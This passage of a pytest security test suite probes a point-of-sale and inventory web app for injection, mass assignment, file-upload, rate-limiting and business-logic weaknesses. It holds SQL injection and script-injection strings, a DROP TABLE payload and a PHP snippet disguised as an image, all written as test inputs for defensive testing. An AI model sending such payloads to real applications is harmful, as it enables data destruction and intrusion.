            response = client.post('/inventory/add', data={
                'code': f'DATE-{uuid.uuid4().hex[:8]}',
                'name': 'Test Product',
                'category_id': category.id,
                'cost_price': '100',
                'selling_price': '200',
                'quantity': '10',
                'expiry_date': invalid_date
            }, follow_redirects=True)

            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_email_validation(self, client, admin_user, db_session):
        """Test email field validation."""
        login_user(client, 'admin_test', 'Admin123!')

        invalid_emails = [
            'not-an-email',
            'missing@domain',
            '@nodomain.com',
            'spaces in@email.com',
            '<script>@email.com',
            "'; DROP TABLE users; --@evil.com",
        ]

        for invalid_email in invalid_emails:
            response = client.post('/settings/users/add', data={
                'username': f'test_{uuid.uuid4().hex[:8]}',
                'email': invalid_email,
                'full_name': 'Test User',
                'password': 'TestPass123!',
                'role': 'cashier'
            }, follow_redirects=True)

            # Should either reject or handle gracefully
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_phone_validation(self, client, admin_user, db_session):
        """Test phone field validation."""
        login_user(client, 'admin_test', 'Admin123!')

        invalid_phones = [
            'not-a-phone',
            '12345678901234567890',  # Too long
            '<script>alert(1)</script>',
            "; DROP TABLE customers; --",
        ]

        for invalid_phone in invalid_phones:
            response = client.post('/customers/add', data={
                'name': 'Test Customer',
                'phone': invalid_phone
            }, follow_redirects=True)

            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_negative_quantity_prevention(self, client, admin_user, product, kiosk_stock, db_session):
        """Test that negative quantities are prevented."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.post(f'/inventory/adjust-stock/{product.id}',
            data=json.dumps({
                'adjustment_type': 'remove',
                'quantity': 99999,  # More than available
                'reason': 'Test'
            }),
            content_type='application/json'
        )

        # Should prevent negative stock
        if response.status_code == 200:
            data = response.get_json()
            if data.get('success'):
                # Verify stock isn't negative
                from app.models import LocationStock
                stock = LocationStock.query.first()
                if stock:
                    assert stock.quantity >= 0


# =============================================================================
# RATE LIMITING TESTS
# =============================================================================

class TestRateLimiting:
    """Rate limiting security tests."""

    @pytest.mark.security
    def test_login_rate_limiting(self, client, db_session):
        """Test rate limiting on login attempts."""
        start_time = time.time()

        # Make many rapid requests
        for i in range(50):
            client.post('/auth/login', data={
                'username': 'nonexistent',
                'password': 'wrongpassword'
            })

        elapsed = time.time() - start_time

        # System should handle this without crashing
        # Ideally would implement rate limiting (429 status)

    @pytest.mark.security
    def test_api_rate_limiting(self, client, admin_user, db_session):
        """Test rate limiting on API endpoints."""
        login_user(client, 'admin_test', 'Admin123!')

        # Make many rapid API requests
        for i in range(100):
            client.get('/pos/search-products?q=test')

        # System should handle this gracefully


# =============================================================================
# SENSITIVE DATA EXPOSURE TESTS
# =============================================================================

class TestSensitiveDataExposure:
    """Sensitive data exposure security tests."""

    @pytest.mark.security
    def test_error_messages_dont_expose_internals(self, client, db_session):
        """Test that error messages don't expose internal details."""
        # Trigger various errors
        error_triggers = [
            '/nonexistent-route',
            '/pos/sale-details/999999999',
            '/inventory/product/999999999',
        ]

        for route in error_triggers:
            response = client.get(route)

            # Should not expose stack traces or internal paths
            assert b'Traceback' not in response.data
            assert b'/home/' not in response.data
            assert b'site-packages' not in response.data

    @pytest.mark.security
    def test_debug_info_not_exposed(self, client, db_session):
        """Test that debug information is not exposed."""
        response = client.get('/')

        # Check for common debug indicators
        assert b'Werkzeug Debugger' not in response.data
        assert b'SQLALCHEMY_DATABASE_URI' not in response.data

    @pytest.mark.security
    def test_customer_data_not_in_logs(self, client, admin_user, customer, db_session):
        """Test that sensitive customer data is properly handled."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.get(f'/customers/view/{customer.id}')

        # Response should show customer data only to authorized users
        assert response.status_code in [200, 302]

    @pytest.mark.security
    def test_api_responses_minimal_data(self, client, admin_user, product, db_session):
        """Test that API responses don't include unnecessary data."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.get(f'/pos/get-product/{product.id}')

        if response.status_code == 200:
            data = response.get_json()
            # Should not include sensitive fields like cost_price in POS response
            # (depending on business requirements)


# =============================================================================
# MASS ASSIGNMENT TESTS
# =============================================================================

class TestMassAssignment:
    """Mass assignment vulnerability tests."""

    @pytest.mark.security
    def test_user_creation_protected_fields(self, client, admin_user, warehouse, db_session):
        """Test that protected fields cannot be set via mass assignment."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.post('/settings/users/add', data={
            'username': 'testuser_mass',
            'email': 'mass@test.com',
            'full_name': 'Mass Test',
            'password': 'TestPass123!',
            'role': 'cashier',
            'location_id': warehouse.id,
            # Attempt to set protected fields
            'id': 999,
            'password_hash': 'injected_hash',
            'created_at': '2000-01-01',
        }, follow_redirects=True)

        # Verify protected fields were not set
        user = User.query.filter_by(username='testuser_mass').first()
        if user:
            assert user.id != 999
            assert user.password_hash != 'injected_hash'

    @pytest.mark.security
    def test_sale_creation_protected_fields(self, client, cashier_user, product, kiosk_stock, db_session):
        """Test that sale protected fields cannot be manipulated."""
        login_user(client, 'cashier_test', 'Cashier123!')

        response = client.post('/pos/complete-sale',
            data=json.dumps({
                'items': [{
                    'product_id': product.id,
                    'quantity': 1,
                    'unit_price': 100,
                    'subtotal': 100
                }],
                'subtotal': 100,
                'total': 100,
                'payment_method': 'cash',
                'amount_paid': 100,
                # Attempt to manipulate protected fields
                'id': 999,
                'user_id': 1,  # Try to change cashier
                'status': 'refunded',  # Try to mark as refunded
            }),
            content_type='application/json'
        )

        if response.status_code == 200:
            data = response.get_json()
            if data.get('success'):
                # Verify protected fields were not manipulated
                sale = Sale.query.get(data.get('sale_id'))
                if sale:
                    assert sale.user_id == cashier_user.id
                    assert sale.status != 'refunded'


# =============================================================================
# FILE UPLOAD SECURITY TESTS
# =============================================================================

class TestFileUploadSecurity:
    """File upload security tests."""

    @pytest.mark.security
    def test_dangerous_file_extension_rejection(self, client, admin_user, category, db_session):
        """Test that dangerous file extensions are rejected."""
        login_user(client, 'admin_test', 'Admin123!')

        dangerous_extensions = ['.php', '.exe', '.sh', '.bat', '.js', '.html', '.py']

        from io import BytesIO

        for ext in dangerous_extensions:
            data = {
                'code': f'FILE-{uuid.uuid4().hex[:8]}',
                'name': 'Test Product',
                'category_id': category.id,
                'cost_price': '100',
                'selling_price': '200',
                'quantity': '10',
                'image': (BytesIO(b'dangerous content'), f'malicious{ext}')
            }

            response = client.post('/inventory/add',
                data=data,
                content_type='multipart/form-data',
                follow_redirects=True
            )

            # Should either reject or not save the dangerous file
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_file_size_limit(self, client, admin_user, category, db_session):
        """Test that file size limits are enforced."""
        login_user(client, 'admin_test', 'Admin123!')

        from io import BytesIO

        # Create a large file (attempt to exceed limit)
        large_content = b'x' * (20 * 1024 * 1024)  # 20MB

        data = {
            'code': f'SIZE-{uuid.uuid4().hex[:8]}',
            'name': 'Test Product',
            'category_id': category.id,
            'cost_price': '100',
            'selling_price': '200',
            'quantity': '10',
            'image': (BytesIO(large_content), 'large_file.jpg')
        }

        response = client.post('/inventory/add',
            data=data,
            content_type='multipart/form-data',
            follow_redirects=True
        )

        # Should reject oversized file
        assert response.status_code in [200, 302, 400, 413]

    @pytest.mark.security
    def test_file_content_validation(self, client, admin_user, category, db_session):
        """Test that file content type is validated."""
        login_user(client, 'admin_test', 'Admin123!')

        from io import BytesIO

        # Upload PHP code disguised as image
        php_content = b'<?php echo "hacked"; ?>'

        data = {
            'code': f'CONTENT-{uuid.uuid4().hex[:8]}',
            'name': 'Test Product',
            'category_id': category.id,
            'cost_price': '100',
            'selling_price': '200',
            'quantity': '10',
            'image': (BytesIO(php_content), 'image.jpg')
        }

        response = client.post('/inventory/add',
            data=data,
            content_type='multipart/form-data',
            follow_redirects=True
        )

        # Should handle gracefully
        assert response.status_code in [200, 302, 400]


# =============================================================================
# BUSINESS LOGIC SECURITY TESTS
# =============================================================================

class TestBusinessLogicSecurity:
    """Business logic security tests."""

    @pytest.mark.security
    def test_negative_price_prevention(self, client, admin_user, category, db_session):
        """Test that negative prices are prevented."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.post('/inventory/add', data={
            'code': f'NEG-{uuid.uuid4().hex[:8]}',
            'name': 'Negative Price Product',
            'category_id': category.id,
            'cost_price': '-100',
            'selling_price': '-200',
            'quantity': '10'
        }, follow_redirects=True)

        # Should reject or handle negative prices
        assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_sale_total_manipulation(self, client, cashier_user, product, kiosk_stock, db_session):
        """Test that sale totals cannot be manipulated."""
        login_user(client, 'cashier_test', 'Cashier123!')

        # Try to complete sale with mismatched totals
        response = client.post('/pos/complete-sale',
            data=json.dumps({
                'items': [{
                    'product_id': product.id,
                    'quantity': 1,
                    'unit_price': 1000,
                    'subtotal': 1000
                }],
                'subtotal': 10,  # Manipulated - should be 1000
                'total': 10,  # Manipulated - should be 1000
                'payment_method': 'cash',
                'amount_paid': 10
            }),
            content_type='application/json'
        )

        # Sale should be created with correct totals or rejected
        if response.status_code == 200:
            data = response.get_json()
            if data.get('success'):
                sale = Sale.query.get(data.get('sale_id'))
                if sale:
                    # Total should match items, not manipulated value
                    assert sale.subtotal >= 1000 or sale.total >= 1000

    @pytest.mark.security
    def test_refund_authorization(self, client, cashier_user, sale, db_session):
        """Test that refunds require proper authorization."""
        login_user(client, 'cashier_test', 'Cashier123!')

        # Cashier attempting refund
        response = client.post(f'/pos/refund-sale/{sale.id}')

        # Depending on permissions, should either work or be denied
        assert response.status_code in [200, 302, 403]

    @pytest.mark.security
    def test_backdate_sale_authorization(self, client, cashier_user, product, kiosk_stock, db_session):
        """Test that backdating sales requires authorization."""
        login_user(client, 'cashier_test', 'Cashier123!')

        # Cashier attempting to backdate sale
        response = client.post('/pos/complete-sale',
            data=json.dumps({
                'items': [{
                    'product_id': product.id,
                    'quantity': 1,
                    'unit_price': 100,
                    'subtotal': 100
                }],
                'subtotal': 100,
                'total': 100,
                'payment_method': 'cash',
                'amount_paid': 100,
                'sale_date': '2020-01-01'  # Backdating
            }),
            content_type='application/json'
        )

        # Should be rejected for cashier
        if response.status_code == 200:
            data = response.get_json()
            if not data.get('success'):
                assert 'admin' in str(data).lower() or 'manager' in str(data).lower()


# =============================================================================
# SECURITY HEADERS TESTS
# =============================================================================

class TestSecurityHeaders:
    """Security headers verification tests."""

    @pytest.mark.security
    def test_content_type_header(self, client, db_session):
        """Test that Content-Type header is properly set."""
        response = client.get('/auth/login')

        content_type = response.headers.get('Content-Type', '')
        assert 'text/html' in content_type

    @pytest.mark.security
    def test_x_content_type_options(self, client, db_session):
        """Test X-Content-Type-Options header (if configured)."""
        response = client.get('/auth/login')

        # This header prevents MIME-type sniffing
        # May or may not be present depending on configuration
        if 'X-Content-Type-Options' in response.headers:
            assert response.headers.get('X-Content-Type-Options') == 'nosniff'

    @pytest.mark.security
    def test_x_frame_options(self, client, db_session):
        """Test X-Frame-Options header (if configured)."""
        response = client.get('/auth/login')

        # This header prevents clickjacking
        # May or may not be present depending on configuration
        if 'X-Frame-Options' in response.headers:
            assert response.headers.get('X-Frame-Options') in ['DENY', 'SAMEORIGIN']


# =============================================================================
# ADDITIONAL EDGE CASE SECURITY TESTS
# =============================================================================

class TestEdgeCaseSecurity:
    """Edge case security tests."""

    @pytest.mark.security
    def test_unicode_handling(self, client, admin_user, db_session):
        """Test proper handling of unicode characters."""
        login_user(client, 'admin_test', 'Admin123!')

        unicode_strings = [
            '\u0000',  # Null byte
            '\uffff',  # Max BMP character
            '\U0001f600',  # Emoji
            'test\x00injection',  # Embedded null
            '\u202e\u202d',  # RLO/LRO (text direction)
        ]

        for unicode_str in unicode_strings:
            response = client.get(f'/customers/search?q={quote(unicode_str)}')
            assert response.status_code in [200, 400]

    @pytest.mark.security
    def test_very_long_input_handling(self, client, admin_user, db_session):
        """Test handling of very long input strings."""
        login_user(client, 'admin_test', 'Admin123!')

        # Very long string
        long_string = 'A' * 100000

        response = client.get(f'/customers/search?q={long_string[:1000]}')  # Limit for URL
        assert response.status_code in [200, 400, 414]  # 414 = URI Too Long

    @pytest.mark.security
    def test_empty_json_handling(self, client, admin_user, db_session):
        """Test handling of empty or malformed JSON."""
        login_user(client, 'admin_test', 'Admin123!')

        malformed_json_cases = [
            '',
            '{}',
            '[]',
            'null',
            'undefined',
            '{invalid json}',
            '{"items": null}',
        ]

        for case in malformed_json_cases:
            response = client.post('/pos/complete-sale',
                data=case,
                content_type='application/json'
            )

            # Should handle gracefully
            assert response.status_code in [200, 400, 500]

    @pytest.mark.security
    def test_concurrent_operation_safety(self, client, admin_user, product, kiosk_stock, db_session):
        """Test safety of concurrent operations."""
        login_user(client, 'admin_test', 'Admin123!')

        initial_stock = kiosk_stock.quantity

        # Simulate concurrent adjustments
        for i in range(5):
            response = client.post(f'/inventory/adjust-stock/{product.id}',
                data=json.dumps({
                    'adjustment_type': 'remove',
                    'quantity': 1,
                    'reason': f'Concurrent test {i}'
                }),
                content_type='application/json'
            )

        # Stock should be consistent
        db.session.refresh(kiosk_stock)
        # Final stock should be reasonable (not negative, not corrupted)
        assert kiosk_stock.quantity >= 0
